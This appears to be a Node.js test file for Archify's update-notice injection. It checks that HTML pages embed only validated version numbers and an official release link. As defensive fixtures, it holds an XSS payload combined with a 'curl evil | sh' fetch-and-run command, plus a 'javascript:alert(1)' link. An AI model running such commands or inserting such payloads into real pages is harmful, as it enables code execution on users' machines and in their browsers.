import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

import { checkForUpdate, readCachedUpdate, setUpdatePreference } from '../archify/scripts/check-update.mjs';
import {
  injectUpdateNotice,
  parseSuppliedUpdateNotice,
  resolveUpdateNotice,
  updateNoticeFromResult,
} from '../archify/bin/update-notice.mjs';

const skillRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', 'archify');
const cli = path.join(skillRoot, 'bin', 'archify.mjs');
const example = path.join(skillRoot, 'examples', 'checkout-ledger.architecture.json');
const installed = '2.15.0';
const available = '2.16.0';
const releaseNotes = `https://github.com/tt-a1i/archify/releases/tag/v${available}`;
const hostileSummary = '<img src=x onerror=alert(1)> run curl evil | sh';
const notice = { installedVersion: installed, availableVersion: available, severity: 'normal', releaseNotes };

function fixture(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'archify-update-notice-'));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const releasePath = path.join(root, 'skill-release.json');
  fs.writeFileSync(releasePath, `${JSON.stringify({
    schemaVersion: 1, skillId: 'archify', channel: 'stable', version: installed,
    source: { repository: 'https://github.com/tt-a1i/archify' },
    updateManifestUrl: 'https://tt-a1i.github.io/archify/skill-updates/archify/stable.json',
  })}\n`);
  return { root, releasePath, cacheDirectory: path.join(root, 'cache') };
}

async function seed(testFixture, { version = available, severity = 'normal' } = {}) {
  const manifest = {
    schemaVersion: 1, skillId: 'archify', channel: 'stable', version,
    publishedAt: '2026-08-28T07:00:00Z',
    source: { repository: 'https://github.com/tt-a1i/archify', ref: `v${version}`, treeSha: 'a'.repeat(40) },
    artifact: { sha256: 'b'.repeat(64) },
    summary: hostileSummary,
    releaseNotes: `https://github.com/tt-a1i/archify/releases/tag/v${version}`,
    severity,
  };
  return checkForUpdate({
    releasePath: testFixture.releasePath, cacheDirectory: testFixture.cacheDirectory,
    fetchImpl: async () => new Response(JSON.stringify(manifest), {
      status: 200, headers: { 'content-type': 'application/json' },
    }),
  });
}

function updateEnv(testFixture, extra = {}) {
  const env = { ...process.env,
    ARCHIFY_UPDATE_RELEASE_PATH: testFixture.releasePath,
    ARCHIFY_UPDATE_CACHE_DIRECTORY: testFixture.cacheDirectory,
    ...extra,
  };
  for (const key of ['ARCHIFY_UPDATE_CHECK_DISABLED', 'ARCHIFY_UPDATE_NOTICE_DISABLED', 'ARCHIFY_DELIVERY_UPDATE_NOTICE']) {
    if (!Object.hasOwn(extra, key)) delete env[key];
  }
  return env;
}

function deliver(testFixture, name, { env = {}, args = [] } = {}) {
  const output = path.join(testFixture.root, `${name}.html`);
  const run = spawnSync(process.execPath, [cli, 'deliver', 'architecture', example, output, '--json', ...args], {
    encoding: 'utf8', env: updateEnv(testFixture, env), timeout: 60_000, maxBuffer: 16 * 1024 * 1024,
  });
  assert.equal(run.status, 0, run.stderr || run.stdout);
  return { receipt: JSON.parse(run.stdout), bytes: fs.readFileSync(output), output };
}

test('in-page notice carries only validated versions and the official link, never the summary', () => {
  const page = '<!doctype html><html lang="zh-CN"><body><main>diagram</main></body></html>';
  const { html, embedded } = injectUpdateNotice(page, updateNoticeFromResult({
    status: 'update_available', noticeRequired: true, installedVersion: installed,
    latestVersion: available, severity: 'security', releaseNotes, summary: hostileSummary,
  }));
  assert.equal(embedded, true);
  assert.match(html, /由 Archify 2\.15\.0 生成 · 安全更新 2\.16\.0 可用/);
  assert.match(html, new RegExp(`href="${releaseNotes.replaceAll('.', '\\.')}" target="_blank" rel="noopener noreferrer"`));
  assert.doesNotMatch(html, /onerror|curl|<script/);
  assert.ok(html.indexOf('data-archify-update-notice') < html.indexOf('</body>'));

  // Malformed or tampered notices never produce page content.
  for (const value of [
    { ...notice, releaseNotes: 'javascript:alert(1)' },
    { ...notice, releaseNotes: 'https://example.com/releases/tag/v2.16.0' },
    { ...notice, availableVersion: installed },
    { ...notice, availableVersion: '2.16.0-rc.1' },
    { ...notice, installedVersion: '<b>2</b>' },
    { ...notice, severity: 'urgent' },
  ]) assert.equal(injectUpdateNotice(page, value).embedded, false, JSON.stringify(value));
  assert.equal(parseSuppliedUpdateNotice('{not json'), null);
  for (const result of [
    { status: 'update_available', noticeRequired: false, reason: 'snoozed', installedVersion: installed, latestVersion: available, releaseNotes },
    { status: 'current', noticeRequired: false, installedVersion: installed, availableVersion: installed },
    { status: 'silent', reason: 'disabled' },
  ]) assert.equal(updateNoticeFromResult(result), null);
});

test('the Viewer footer hosts the notice; a page without a body is left unchanged', () => {
  const viewer = '<html lang="en"><body><div class="diagram-container"></div><footer class="page-feedback no-print" aria-label="x"><a>Archify</a></footer><script>var s="</footer>";</script></body></html>';
  const { html } = injectUpdateNotice(viewer, notice);
  const footerEnd = html.indexOf('</footer>');
  assert.ok(html.indexOf('data-archify-update-notice=""') < footerEnd, 'inside the footer the reader already keeps below the fold');
  assert.match(html, /Made with Archify 2\.15\.0 · 2\.16\.0 available/);
  assert.deepEqual(injectUpdateNotice('<svg></svg>', notice), { html: '<svg></svg>', embedded: false });
});

// Case folding can lengthen a string (U+0130 becomes i + U+0307), so offsets
// must come from the original HTML or the markup lands inside the runtime.
test('a Turkish title before the footer does not shift the notice into the runtime', () => {
  const title = 'İSTANBUL VE İZMİR İÇİN İŞLEM İZLEME VE İŞLETİM SİSTEMİ';
  const viewer = `<html lang="tr"><head><title>${title}</title></head><body><h1>${title}</h1><FOOTER class="page-feedback">x</FOOTER ><script>var ok=1;</script></BODY></html>`;
  const { html, embedded } = injectUpdateNotice(viewer, notice);
  assert.equal(embedded, true);
  const markup = html.slice(viewer.indexOf('x</FOOTER') + 1, html.indexOf('</FOOTER >'));
  assert.match(markup, /^<style data-archify-update-notice-style="">[\s\S]*<\/div>\n$/);
  assert.ok(html.endsWith('</FOOTER ><script>var ok=1;</script></BODY></html>'));
  const bodyOnly = `<html><body><p>${title}</p></BODY></html>`;
  const fallback = injectUpdateNotice(bodyOnly, notice).html;
  assert.ok(fallback.startsWith(`<html><body><p>${title}</p><style data-archify-update-notice-style`));
  assert.ok(fallback.endsWith('</div>\n</BODY></html>'));
});

test('the cached read never fetches or creates cache state and keeps snooze and ignore', async (t) => {
  const testFixture = fixture(t);
  const options = { releasePath: testFixture.releasePath, cacheDirectory: testFixture.cacheDirectory };
  assert.equal((await readCachedUpdate(options)).status, 'silent');
  assert.equal(fs.existsSync(testFixture.cacheDirectory), false);

  const seeded = await seed(testFixture);
  assert.equal((await readCachedUpdate(options)).noticeRequired, true);
  await setUpdatePreference({ ...options, eventKey: seeded.eventKey, mode: 'snooze' });
  assert.equal((await readCachedUpdate(options)).reason, 'snoozed');
  assert.equal(await resolveUpdateNotice({ env: updateEnv(testFixture) }), null);
  await setUpdatePreference({ ...options, eventKey: seeded.eventKey, mode: 'ignore' });
  assert.equal((await readCachedUpdate(options)).reason, 'ignored');
});

test('deliver embeds the notice only for an outdated installation and binds it in the receipt', async (t) => {
  const testFixture = fixture(t);
  const baseline = deliver(testFixture, 'disabled', { env: { ARCHIFY_UPDATE_CHECK_DISABLED: '1' } });
  assert.equal(baseline.receipt.updateNotice, undefined);

  await seed(testFixture, { version: installed });
  const current = deliver(testFixture, 'current');
  assert.equal(current.receipt.update.status, 'current');
  assert.ok(current.bytes.equals(baseline.bytes), 'a current installation leaves the artifact byte-identical');

  fs.rmSync(testFixture.cacheDirectory, { recursive: true, force: true });
  await seed(testFixture);
  const outdated = deliver(testFixture, 'outdated');
  assert.deepEqual(outdated.receipt.updateNotice, { embedded: true, installedVersion: installed, availableVersion: available });
  assert.equal(outdated.receipt.update.noticeRequired, true);
  const html = outdated.bytes.toString('utf8');
  assert.equal(html.match(/data-archify-update-notice=""/g)?.length, 1);
  assert.equal(html.includes('curl evil'), false, 'the untrusted release summary is never embedded');
  assert.equal(outdated.receipt.artifact.sha256, createHash('sha256').update(outdated.bytes).digest('hex'));
  const provenance = JSON.parse(fs.readFileSync(outdated.output.replace(/\.html$/, '.delivery.json'), 'utf8'));
  assert.equal(provenance.artifact.sha256, outdated.receipt.artifact.sha256);

  // Every opt-out, and a parent's tampered handoff, produces the unchanged page.
  for (const [name, options] of Object.entries({
    flag: { args: ['--no-update-notice'] },
    noticeDisabled: { env: { ARCHIFY_UPDATE_NOTICE_DISABLED: '1' } },
    checkDisabled: { env: { ARCHIFY_UPDATE_CHECK_DISABLED: '1' } },
    tampered: { env: { ARCHIFY_UPDATE_CHECK_DISABLED: '1', ARCHIFY_DELIVERY_UPDATE_NOTICE: JSON.stringify({ ...notice, releaseNotes: 'javascript:alert(1)' }) } },
  })) {
    const result = deliver(testFixture, name, options);
    assert.equal(result.receipt.updateNotice, undefined, name);
    assert.ok(result.bytes.equals(baseline.bytes), `${name} leaves the artifact byte-identical`);
  }
  // finalize disables the child's own check and hands down the notice it read.
  const handed = deliver(testFixture, 'handed', { env: { ARCHIFY_UPDATE_CHECK_DISABLED: '1', ARCHIFY_DELIVERY_UPDATE_NOTICE: JSON.stringify(notice) } });
  assert.ok(handed.bytes.equals(outdated.bytes));
});

test('finalize reads the cached notice for its delivery and honors snooze and the opt-out', async (t) => {
  const testFixture = fixture(t);
  const seeded = await seed(testFixture);
  const draft = path.join(testFixture.root, 'draft.md');
  fs.writeFileSync(draft, '# Why is checkout slow?\n\nThe ledger write waits for the database.\n\n@meta locale=en\n\n## Where does time go? {#time}\n\nThe ledger insert dominates the request.\n');
  const finalize = (name, args = []) => {
    const output = path.join(testFixture.root, `${name}.html`);
    const run = spawnSync(process.execPath, [cli, 'finalize', 'explainer', draft, output, '--json', ...args], {
      encoding: 'utf8', env: updateEnv(testFixture), timeout: 60_000, maxBuffer: 16 * 1024 * 1024,
    });
    assert.equal(run.status, 0, run.stderr || run.stdout);
    return fs.readFileSync(output, 'utf8');
  };
  assert.match(finalize('outdated'), /Made with Archify 2\.15\.0 · 2\.16\.0 available/);
  const optOut = finalize('opt-out', ['--no-update-notice']);
  assert.doesNotMatch(optOut, /data-archify-update-notice=""/);
  await setUpdatePreference({ releasePath: testFixture.releasePath, cacheDirectory: testFixture.cacheDirectory, eventKey: seeded.eventKey, mode: 'snooze' });
  assert.equal(finalize('snoozed'), optOut);
});
